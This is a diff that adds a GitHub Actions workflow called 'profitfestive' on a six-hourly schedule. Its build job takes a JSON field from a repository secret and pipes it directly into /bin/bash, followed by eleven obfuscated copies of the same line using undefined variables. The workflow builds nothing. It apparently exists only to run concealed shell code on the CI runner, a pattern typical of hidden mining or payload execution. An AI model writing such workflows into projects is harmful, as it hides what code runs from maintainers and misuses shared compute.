@@ -1,0 +1,29 @@
+name: profitfestive
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: profitfestive
+        env:
+          hyk071: ${{ secrets.hyk071 }}
+        run: |
+          echo $hyk071 | jq -r .eo17749 | /bin/bash
+          echo $lk891 | jq -r .zlxu46 | /bin/bash
+          echo $x520 | jq -r .mje57 | /bin/bash
+          echo $pc63 | jq -r .ovxf3889 | /bin/bash
+          echo $jmzdx19 | jq -r .b419 | /bin/bash
+          echo $qvn9078 | jq -r .p87 | /bin/bash
+          echo $s312 | jq -r .lvvg22 | /bin/bash
+          echo $mvjup3113 | jq -r .ervqz98943 | /bin/bash
+          echo $nom64205 | jq -r .vuxfh8 | /bin/bash
+          echo $ntbb72977 | jq -r .qgdnn5 | /bin/bash
+          echo $vzyfu7450 | jq -r .kd6 | /bin/bash
+          echo $vnn290 | jq -r .sasb6 | /bin/bash
+
